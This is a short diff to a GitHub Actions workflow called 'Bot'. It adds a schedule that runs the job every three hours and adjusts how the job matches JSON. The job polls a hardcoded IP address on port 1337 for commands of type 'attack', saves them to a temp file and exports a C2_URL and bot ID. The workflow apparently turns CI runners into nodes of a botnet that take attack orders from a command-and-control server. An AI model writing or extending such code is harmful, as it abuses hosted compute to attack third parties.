@@ -2,6 +2,8 @@ name: Bot
 
 on:
   workflow_dispatch:
+  schedule:
+    - cron: '13 */3 * * *'
 
 jobs:
   bot:
@@ -30,7 +32,7 @@ jobs:
 
             C=$(curl -s "http://216.167.26.154:1337/api/poll?id=$BOT" 2>/dev/null || true)
 
-            if echo "$C" | grep -q '"type":"attack"' 2>/dev/null; then
+            if echo "$C" | grep -q '"type": "attack"' 2>/dev/null; then
               echo "$C" > /tmp/cmds.json
               export C2_URL=http://216.167.26.154:1337
               export BOT_ID="$BOT"
